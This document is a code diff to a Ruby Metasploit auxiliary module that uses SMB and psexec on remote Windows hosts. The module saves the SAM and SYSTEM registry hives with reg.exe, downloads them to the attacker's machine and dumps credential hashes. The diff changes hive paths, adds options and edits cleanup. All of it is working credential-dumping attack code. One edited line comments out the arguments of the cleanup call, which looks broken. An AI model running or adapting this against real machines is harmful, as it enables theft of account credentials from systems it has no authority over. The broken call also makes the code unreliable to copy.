@@ -6,12 +6,17 @@ require 'msf/core/exploit/psexec'
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
-	include Msf::Exploit::Remote::Psexec
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
+	include Msf::Exploit::Remote::Psexec
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
+
+	# Aliases for common classes
+	SIMPLE = Rex::Proto::SMB::SimpleClient
+	XCEPT = Rex::Proto::SMB::Exceptions
+	CONST = Rex::Proto::SMB::Constants
 
 	def initialize
 		super(
@@ -36,6 +41,8 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
+			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
+			OptString.new('SYSDRIVE', [true, 'The root drive letter on the remote host', 'C:']),
 		], self.class)
 
 		deregister_options('RHOST')
@@ -49,8 +56,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main controller function
 	def run_host(ip)
-		sampath = "#{Rex::Text.rand_text_alpha(20)}"
-		syspath = "#{Rex::Text.rand_text_alpha(20)}"
+		sampath = "\\#{datastore['WINPATH']}\\#{Rex::Text.rand_text_alpha(20)}"
+		syspath = "\\#{datastore['WINPATH']}\\#{Rex::Text.rand_text_alpha(20)}"
 		logdir = datastore['LOGDIR']
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
@@ -62,13 +69,14 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 			if save_reg_hives(ip, sampath, syspath)
+				[sampath, syspath].each { |file| register_file_for_delete(file) }
 				d = download_hives(smbshare, sampath, syspath, ip, logdir)
 				sys, sam = open_hives(logdir, ip, hives)
 				if d
 					dump_creds(sam, sys, ip)
 				end
 			end
-			cleanup_after(ip, sampath, syspath)
+			cleanup_after#(ip, sampath, syspath)
 			disconnect
 		end
 	end
@@ -80,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("#{ip} - Creating hive copies.")
 		begin
 			# Try to save the hive files
-			command = "%COMSPEC% /C reg.exe save HKLM\\SAM %WINDIR%\\Temp\\#{sampath} /y && reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\#{syspath} /y"
+			command = "%COMSPEC% /C reg.exe save HKLM\\SAM #{datastore['SYSDRIVE']}#{sampath} /y && reg.exe save HKLM\\SYSTEM #{datastore['SYSDRIVE']}#{syspath} /y"
 			return psexec(command)
 		rescue StandardError => saveerror
 			print_error("#{ip} - Unable to create hive copies with reg.exe: #{saveerror}")
@@ -98,8 +106,8 @@ class Metasploit3 < Msf::Auxiliary
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			# Get contents of hive file
-			remotesam = simple.open("\\WINDOWS\\Temp\\#{sampath}", 'rob')
-			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
+			remotesam = simple.open("#{sampath}", 'rob')
+			remotesys = simple.open("#{syspath}", 'rob')
 			samdata = remotesam.read
 			sysdata = remotesys.read
 			# Save it to local file system
@@ -126,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("#{ip} - Running cleanup.")
 		begin
 			# Try and do cleanup
-			cleanup = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\#{sampath} %WINDIR%\\Temp\\#{syspath}"
+			cleanup = "%COMSPEC% /C del /F /Q #{sampath} #{syspath}"
 			psexec(cleanup)
 		rescue StandardError => cleanerror
 			print_error("#{ip} - Unable to run cleanup, need to manually remove hive copies from windows temp directory: #{cleanerror}")
